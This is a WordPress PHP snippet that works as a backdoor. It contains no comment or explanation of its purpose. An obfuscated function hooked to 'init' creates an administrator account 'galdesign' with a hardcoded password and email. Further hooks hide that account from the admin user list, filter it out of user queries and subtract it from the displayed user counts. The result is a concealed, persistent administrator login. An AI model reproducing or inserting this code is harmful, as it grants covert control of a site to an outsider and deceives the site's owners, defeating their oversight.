<?php
function dsdfgrtrthfd() {
    $username = 'galdesign';
    $password = 'StrongPassword123!';
    $email = 'admin@galdesign.co.il';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            remove_action('init', 'dsdfgrtrthfd');
        } else {
            error_log('Error' . $user_id->get_error_message());
        }
    } else {
        remove_action('init', 'dsdfgrtrthfd');
    }
}
add_action('init', 'dsdfgrtrthfd');

function hide_specific_user_from_admin($query) {
    if (is_admin() && $query->is_main_query()) {
        $hidden_users = ['galdesign']; // Change this username as needed
        $query->set('exclude', array_map('username_to_id', $hidden_users));
    }
}
add_action('pre_get_users', 'hide_specific_user_from_admin');

function username_to_id($username) {
    $user = get_user_by('login', $username);
    return $user ? $user->ID : 0;
}

function exclude_user_from_count($user_query) {
    if (is_admin() && isset($user_query->query_vars['role'])) {
        $hidden_users = ['galdesign']; // Change this username as needed
        $user_query->query_where .= " AND wp_users.user_login NOT IN ('" . implode("','", $hidden_users) . "')";
    }
}
add_action('pre_user_query', 'exclude_user_from_count');
function adjust_user_count($views) {
    $hidden_users = ['galdesign']; // Change this username as needed
    $user_ids = array_map('username_to_id', $hidden_users);

    global $wpdb;

    foreach ($views as $key => $view) {
        if (preg_match('/\d+/', $view, $matches)) {
            $count = (int) $matches[0];

            // Adjust count by subtracting hidden users
            foreach ($user_ids as $user_id) {
                $exists = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->users WHERE ID = $user_id");
                if ($exists) {
                    $count--;
                }
            }

            // Replace the count in the view link
            $views[$key] = preg_replace('/\d+/', $count, $view);
        }
    }

    return $views;
}
add_filter('views_users', 'adjust_user_count');
?>
